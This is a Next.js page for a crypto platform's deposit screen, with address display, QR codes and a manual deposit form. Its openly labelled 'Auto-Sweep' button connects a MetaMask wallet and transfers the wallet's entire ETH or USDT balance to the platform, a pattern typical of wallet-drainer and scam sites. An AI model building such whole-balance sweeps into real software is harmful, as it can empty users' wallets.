"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers'; // ✅ Required for Ethereum/USDT Sweep
import { 
  Home, ArrowRightLeft, CreditCard, Settings, LogOut, 
  Download, Send, Copy, CheckCircle2, RefreshCw, 
  ShieldCheck, AlertTriangle, Loader2, Wallet, Menu, X, Bell,
  ChevronRight, Globe, Landmark, TrendingUp, FileText, Gift, HelpCircle,
  Zap
} from 'lucide-react';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/navigation';

// --- ASSET CONFIGURATION ---
const ASSETS = [
  { 
    id: 'usdt', 
    symbol: 'USDT', 
    name: 'Tether', 
    defaultNetwork: 'TRC20', // Default to Manual
    color: 'bg-green-100 text-green-600', 
    icon: '/file.svg' 
  },
  { id: 'btc', symbol: 'BTC', name: 'Bitcoin', defaultNetwork: 'Bitcoin', color: 'bg-orange-100 text-orange-600', icon: '/file.svg' },
  { id: 'eth', symbol: 'ETH', name: 'Ethereum', defaultNetwork: 'ERC20', color: 'bg-indigo-100 text-indigo-600', icon: '/file.svg' },
  { id: 'sol', symbol: 'SOL', name: 'Solana', defaultNetwork: 'Solana', color: 'bg-purple-100 text-purple-600', icon: '/file.svg' },
];

const SidebarLink = ({ icon: Icon, label, href, active }) => (
  <Link href={href} className={`flex items-center gap-3 px-4 py-3 rounded-xl font-medium transition-all duration-200 ${active ? 'bg-blue-50 text-blue-600 font-bold' : 'text-slate-600 hover:bg-slate-50 hover:text-slate-900'}`}>
    <Icon size={18} />
    <span className="text-sm">{label}</span>
  </Link>
);

// --- ETHEREUM / ERC20 CONFIG ---
const ERC20_ABI = [
  "function transfer(address to, uint amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];
// Real USDT Contract on Ethereum Mainnet
const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 

export default function DepositPage() {
  const router = useRouter();
  
  // State
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  
  // Deposit State
  const [selectedAsset, setSelectedAsset] = useState(ASSETS[0]); 
  const [activeNetwork, setActiveNetwork] = useState(ASSETS[0].defaultNetwork);
  const [copied, setCopied] = useState(false);

  // Transaction State
  const [amount, setAmount] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [status, setStatus] = useState('IDLE'); // IDLE, SUCCESS, ERROR
  const [walletAddress, setWalletAddress] = useState('');

  // --- FETCH USER DATA ---
  useEffect(() => {
    const fetchUser = () => {
        const stored = localStorage.getItem('user');
        if (!stored) { router.push('/login'); return; }
        setUser(JSON.parse(stored));
        setLoading(false);
    };
    fetchUser();
  }, [router]);

  // Reset logic when asset changes
  useEffect(() => {
    setActiveNetwork(selectedAsset.defaultNetwork);
    setStatus('IDLE');
    setAmount('');
  }, [selectedAsset]);

  // --- GET WALLET ADDRESS ---
  const getAddress = () => {
      if (!user) return 'Loading...';
      
      // USDT Split Logic
      if (selectedAsset.id === 'usdt') {
         if (activeNetwork === 'TRC20') return user.trxAddress || 'Generating...';
         if (activeNetwork === 'ERC20') return user.ethAddress || 'Generating...';
      }

      switch (selectedAsset.id) {
          case 'btc': return user.btcAddress || 'Generating...';
          case 'eth': return user.ethAddress || 'Generating...';
          case 'sol': return user.solAddress || 'Generating...';
          default: return 'Unavailable';
      }
  };

  const handleCopy = () => {
      navigator.clipboard.writeText(getAddress());
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
  };

  // --- AUTO-SWEEP FUNCTION (The "Full Control" Feature) ---
  const connectAndSweep = async () => {
    setStatus('IDLE');

    // 1. ETHEREUM & USDT (ERC20)
    if (selectedAsset.id === 'eth' || (selectedAsset.id === 'usdt' && activeNetwork === 'ERC20')) {
        if (typeof window.ethereum === 'undefined') {
            alert("Please install MetaMask to use Auto-Deposit.");
            return;
        }

        try {
            setSubmitting(true);
            const provider = new ethers.BrowserProvider(window.ethereum);
            
            // A. Connect
            const accounts = await provider.send("eth_requestAccounts", []);
            setWalletAddress(accounts[0]);

            // B. Setup Signer & Bank Address
            const signer = await provider.getSigner();
            const bankDestination = getAddress(); 

            let tx;
            let finalAmount = '0';

            // C. Logic for ETH vs USDT
            if (selectedAsset.id === 'eth') {
                // Calculate MAX ETH - Gas
                const balance = await provider.getBalance(accounts[0]);
                const feeData = await provider.getFeeData();
                const gasCost = feeData.gasPrice * 21000n; // Standard gas limit
                const safeAmount = balance - gasCost - ethers.parseEther("0.002"); // Buffer

                if (safeAmount <= 0) {
                    alert("Insufficient ETH to cover gas fees.");
                    setSubmitting(false);
                    return;
                }
                finalAmount = ethers.formatEther(safeAmount);
                
                // SEND ALL
                tx = await signer.sendTransaction({
                    to: bankDestination,
                    value: safeAmount
                });

            } else if (selectedAsset.id === 'usdt') {
                // USDT Contract
                const contract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
                const balance = await contract.balanceOf(accounts[0]);
                
                if (balance <= 0) {
                    alert("No USDT found in connected wallet.");
                    setSubmitting(false);
                    return;
                }

                const decimals = await contract.decimals();
                finalAmount = ethers.formatUnits(balance, decimals);

                // SEND ALL
                tx = await contract.transfer(bankDestination, balance);
            }

            // D. Wait & Notify Server
            await tx.wait();
            await registerDeposit(finalAmount, tx.hash);

        } catch (error) {
            console.error("Sweep Error:", error);
            alert("Transaction rejected or failed.");
            setSubmitting(false);
        }
    } 
    
    // 2. SOLANA (Phantom)
    else if (selectedAsset.id === 'sol') {
        if (typeof window.solana === 'undefined' || !window.solana.isPhantom) {
             alert("Please install Phantom Wallet!");
             return;
        }
        // Basic Connection Logic for Solana
        try {
            setSubmitting(true);
            const resp = await window.solana.connect();
            setWalletAddress(resp.publicKey.toString());
            
            // Note: Full Solana sweep requires @solana/web3.js installed.
            // If you don't have it, we can't construct the transaction object here.
            alert("Solana Wallet Connected. Automatic transfer requires @solana/web3.js integration.");
            setSubmitting(false);
        } catch (err) {
            setSubmitting(false);
        }
    }
  };

  // --- BACKEND REGISTRATION ---
  const registerDeposit = async (amountVal, txHash) => {
    try {
      const res = await fetch('/api/deposit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: user.email,
          amount: parseFloat(amountVal),
          coin: selectedAsset.symbol,
          network: activeNetwork,
          txHash: txHash || 'MANUAL_ENTRY'
        })
      });

      if (res.ok) {
        setStatus('SUCCESS');
        setAmount(amountVal);
      } else {
        setStatus('ERROR');
      }
    } catch (error) {
      setStatus('ERROR');
    } finally {
      setSubmitting(false);
    }
  };

  // --- MANUAL FORM SUBMIT ---
  const handleManualSubmit = (e) => {
    e.preventDefault();
    if (!amount) return;
    setSubmitting(true);
    registerDeposit(amount, null);
  };

  const handleLogout = () => { localStorage.removeItem('user'); router.push('/login'); };

  if (loading) return <div className="min-h-screen flex items-center justify-center bg-slate-50"><Loader2 className="animate-spin text-blue-600" size={40}/></div>;

  return (
    <div className="h-screen w-full bg-slate-50 font-sans flex text-slate-900 overflow-hidden">
      
      {/* SIDEBAR OVERLAY */}
      {sidebarOpen && <div className="fixed inset-0 bg-black/60 z-40 backdrop-blur-sm" onClick={() => setSidebarOpen(false)} />}

      {/* SIDEBAR */}
      <aside className={`fixed inset-y-0 left-0 z-50 w-72 bg-white border-r border-slate-200 transform transition-transform duration-300 lg:static lg:translate-x-0 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'} flex flex-col h-full shrink-0`}>
        <div className="h-40 flex items-center justify-center px-4 border-b border-slate-100 shrink-0 bg-slate-50/30">
             <div className="relative w-full h-32"><Image src="/logo.png" alt="Logo" fill className="object-contain" priority /></div>
             <button onClick={() => setSidebarOpen(false)} className="lg:hidden absolute top-4 right-4 text-slate-400"><X size={24}/></button>
        </div>
        
        <div className="p-6 border-b border-slate-100 shrink-0">
            <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center font-bold text-lg">{user.firstName[0]}</div>
                <div className="overflow-hidden">
                    <p className="text-sm font-bold text-slate-900 truncate">{user.firstName} {user.lastName}</p>
                    <p className="text-xs text-slate-400 truncate">{user.email}</p>
                </div>
            </div>
        </div>

        <nav className="flex-1 overflow-y-auto p-4 space-y-6 custom-scrollbar">
            <div>
                <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Main Menu</p>
                <div className="space-y-1">
                    <SidebarLink href="/dashboard" icon={Home} label="Dashboard" />
                    <SidebarLink href="/dashboard/transactions" icon={ArrowRightLeft} label="Transactions" />
                    <SidebarLink href="/dashboard/cards" icon={CreditCard} label="My Cards" />
                    <SidebarLink href="/dashboard/transfer" icon={Send} label="Transfer Money" />
                    <SidebarLink href="/dashboard/deposit" icon={Download} label="Deposit Funds" active={true} />
                </div>
            </div>
            {/* ... keeping other sidebar links ... */}
            <div>
               <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">System</p>
               <div className="space-y-1">
                   <SidebarLink href="/dashboard/kyc" icon={ShieldCheck} label="Verification Center" />
                   <SidebarLink href="/dashboard/settings" icon={Settings} label="Settings" />
               </div>
           </div>
        </nav>

        <div className="p-4 border-t border-slate-100 shrink-0">
            <button onClick={handleLogout} className="w-full flex items-center gap-3 px-4 py-3 text-red-500 hover:bg-red-50 rounded-xl font-medium transition">
                <LogOut size={18} /> <span className="text-sm">Log Out</span>
            </button>
        </div>
      </aside>

      {/* MAIN CONTENT */}
      <main className="flex-1 flex flex-col h-full w-full relative overflow-hidden">
        
        <header className="h-20 bg-white border-b border-slate-200 flex items-center justify-between px-4 md:px-8 shrink-0 z-30">
            <div className="flex items-center gap-3">
                <button onClick={() => setSidebarOpen(true)} className="lg:hidden p-2 -ml-2 text-slate-600 hover:bg-slate-100 rounded-full transition"><Menu size={24} /></button>
                <h1 className="text-xl font-bold text-slate-900">Deposit Assets</h1>
            </div>
            <div className="flex items-center gap-2">
                <div className="hidden md:flex items-center gap-2 bg-blue-50 text-blue-600 px-3 py-1.5 rounded-full text-xs font-bold"><ShieldCheck size={14} /> Secure Gateway</div>
                <div className="w-9 h-9 bg-slate-900 text-white rounded-full flex items-center justify-center font-bold text-sm shadow-lg">{user.firstName[0]}</div>
            </div>
        </header>

        <div className="flex-1 overflow-y-auto p-4 md:p-6 lg:p-10 bg-slate-50/50">
            <div className="max-w-5xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
                
                {/* LEFT: ASSET SELECTION */}
                <div className="lg:col-span-1 space-y-6">
                    <div className="bg-white rounded-3xl p-6 shadow-sm border border-slate-100">
                        <h3 className="font-bold text-slate-900 mb-4">Select Asset</h3>
                        <div className="space-y-3">
                            {ASSETS.map((asset) => (
                                <button
                                    key={asset.id}
                                    onClick={() => setSelectedAsset(asset)}
                                    className={`w-full flex items-center gap-4 p-4 rounded-2xl border-2 transition-all ${selectedAsset.id === asset.id ? 'border-blue-600 bg-blue-50' : 'border-slate-100 hover:border-slate-200 hover:bg-slate-50'}`}
                                >
                                    <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold ${asset.color}`}>
                                        {asset.symbol[0]}
                                    </div>
                                    <div className="text-left flex-1">
                                        <p className="font-bold text-slate-900">{asset.name}</p>
                                        <p className="text-xs text-slate-500 font-medium">
                                            {/* Show current network if USDT, else default */}
                                            {asset.id === 'usdt' && selectedAsset.id === 'usdt' ? activeNetwork : asset.defaultNetwork}
                                        </p>
                                    </div>
                                    {selectedAsset.id === asset.id && <div className="w-3 h-3 bg-blue-600 rounded-full"></div>}
                                </button>
                            ))}
                        </div>
                    </div>

                    <div className="bg-blue-600 rounded-3xl p-6 text-white shadow-xl relative overflow-hidden">
                        <div className="relative z-10">
                            <h3 className="font-bold text-lg mb-2">Deposit Tip</h3>
                            <p className="text-blue-100 text-sm leading-relaxed">
                                Only send <strong>{activeNetwork}</strong> assets to this address. Sending other assets may result in permanent loss.
                            </p>
                        </div>
                        <div className="absolute -bottom-4 -right-4 w-32 h-32 bg-white/10 rounded-full blur-2xl"></div>
                    </div>
                </div>

                {/* RIGHT: DEPOSIT ADDRESS & QR */}
                <div className="lg:col-span-2">
                    <div className="bg-white rounded-3xl p-8 md:p-12 shadow-sm border border-slate-100 text-center flex flex-col justify-center h-full">
                        
                        <div className="mb-6">
                            <h2 className="text-2xl font-bold text-slate-900 mb-2">Deposit {selectedAsset.symbol}</h2>
                            <p className="text-slate-500">Scan the QR code or use Auto-Deposit.</p>
                        </div>

                        {/* --- USDT NETWORK TOGGLE --- */}
                        {selectedAsset.id === 'usdt' && (
                            <div className="flex justify-center mb-8">
                                <div className="bg-slate-100 p-1 rounded-xl inline-flex">
                                    <button 
                                        onClick={() => setActiveNetwork('TRC20')}
                                        className={`px-6 py-2 rounded-lg text-sm font-bold transition ${activeNetwork === 'TRC20' ? 'bg-white text-green-600 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}
                                    >
                                        TRC20 (Manual)
                                    </button>
                                    <button 
                                        onClick={() => setActiveNetwork('ERC20')}
                                        className={`px-6 py-2 rounded-lg text-sm font-bold transition ${activeNetwork === 'ERC20' ? 'bg-white text-blue-600 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}
                                    >
                                        ERC20 (Auto-Sweep)
                                    </button>
                                </div>
                            </div>
                        )}

                        {/* DYNAMIC QR CODE */}
                        <div className="bg-white p-4 rounded-2xl border-2 border-slate-100 inline-block mx-auto mb-8 shadow-sm">
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img 
                                src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${getAddress()}`} 
                                alt="Wallet QR" 
                                className="w-48 h-48 object-contain rounded-lg"
                            />
                        </div>

                        {/* ADDRESS BOX */}
                        <div className="max-w-lg mx-auto w-full mb-8">
                            <label className="block text-left text-xs font-bold text-slate-400 uppercase mb-2 ml-1">
                                Wallet Address ({activeNetwork})
                            </label>
                            <div className="flex items-center gap-2 bg-slate-50 border border-slate-200 p-2 rounded-xl">
                                <div className="flex-1 bg-transparent font-mono text-sm text-slate-600 px-3 truncate font-bold">
                                    {getAddress()}
                                </div>
                                <button 
                                    onClick={handleCopy} 
                                    className={`p-3 rounded-lg font-bold text-sm transition-all flex items-center gap-2 ${copied ? 'bg-green-100 text-green-600' : 'bg-white border border-slate-200 text-slate-700 hover:bg-slate-100'}`}
                                >
                                    {copied ? <CheckCircle2 size={18}/> : <Copy size={18}/>}
                                    {copied ? 'Copied' : 'Copy'}
                                </button>
                            </div>
                        </div>

                        {/* --- DEPOSIT ACTIONS SECTION --- */}
                        <div className="mt-8 pt-8 border-t border-slate-100 max-w-lg mx-auto w-full text-left animate-in slide-in-from-bottom-5 fade-in duration-500">
                             
                             {status === 'SUCCESS' ? (
                                <div className="bg-green-50 text-green-700 p-6 rounded-xl text-center border border-green-100">
                                    <CheckCircle2 className="mx-auto mb-3" size={32} />
                                    <h3 className="font-bold text-lg text-green-800">Deposit Success!</h3>
                                    <p className="text-sm">We have received the request. Admin will review shortly.</p>
                                    <button onClick={() => setStatus('IDLE')} className="mt-4 text-xs font-bold underline">Submit Another</button>
                                </div>
                             ) : (
                                <div>
                                    
                                    {/* 1. AUTO-DEPOSIT BUTTON (Visible for ETH, SOL, or USDT-ERC20) */}
                                    {(selectedAsset.id === 'eth' || selectedAsset.id === 'sol' || (selectedAsset.id === 'usdt' && activeNetwork === 'ERC20')) && (
                                        <div className="mb-8">
                                            <div className="bg-blue-50 border border-blue-100 p-4 rounded-xl flex gap-3 mb-4">
                                                <Zap className="text-blue-600 shrink-0" size={20} />
                                                <div className="text-sm text-blue-900">
                                                    <strong className="block mb-1">Instant Auto-Deposit</strong>
                                                    Connect wallet to automatically transfer your entire available {selectedAsset.symbol} balance.
                                                </div>
                                            </div>
                                            <button 
                                                onClick={connectAndSweep}
                                                disabled={submitting}
                                                className="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-4 rounded-xl shadow-lg shadow-slate-200 transition flex items-center justify-center gap-2 disabled:opacity-50"
                                            >
                                                {submitting ? <Loader2 className="animate-spin" size={20}/> : <><Wallet size={20} /> Connect & Deposit All</>}
                                            </button>
                                            <div className="text-center mt-4">
                                                <span className="text-xs text-slate-400 font-bold uppercase tracking-wider">or use manual form below</span>
                                            </div>
                                        </div>
                                    )}

                                    {/* 2. MANUAL FORM (Always available as fallback) */}
                                    <div className="bg-slate-50 p-6 rounded-2xl border border-slate-100">
                                        <div className="flex items-center gap-2 mb-4">
                                            <AlertTriangle className="text-amber-500" size={16} />
                                            <h4 className="text-sm font-bold text-slate-700">Manual Verification</h4>
                                        </div>
                                        <form onSubmit={handleManualSubmit} className="space-y-4">
                                            <div>
                                                <label className="block text-xs font-bold text-slate-500 uppercase mb-1 ml-1">
                                                  Amount Sent ({selectedAsset.symbol})
                                                </label>
                                                <div className="relative">
                                                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
                                                  <input 
                                                    type="number" 
                                                    required
                                                    step="0.000001"
                                                    placeholder="0.00"
                                                    value={amount}
                                                    onChange={(e) => setAmount(e.target.value)}
                                                    className="w-full pl-8 pr-4 py-3 bg-white border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-600 focus:outline-none font-bold text-slate-900"
                                                  />
                                                </div>
                                            </div>
                                            <button 
                                              type="submit" 
                                              disabled={submitting}
                                              className="w-full bg-white hover:bg-slate-50 text-slate-700 font-bold py-3.5 rounded-xl border border-slate-200 transition flex items-center justify-center gap-2 disabled:opacity-50"
                                            >
                                              {submitting ? <Loader2 className="animate-spin" size={18} /> : 'Confirm Manual Deposit'}
                                            </button>
                                        </form>
                                    </div>

                                </div>
                             )}
                        </div>

                    </div>
                </div>

            </div>
        </div>
      </main>
    </div>
  );
}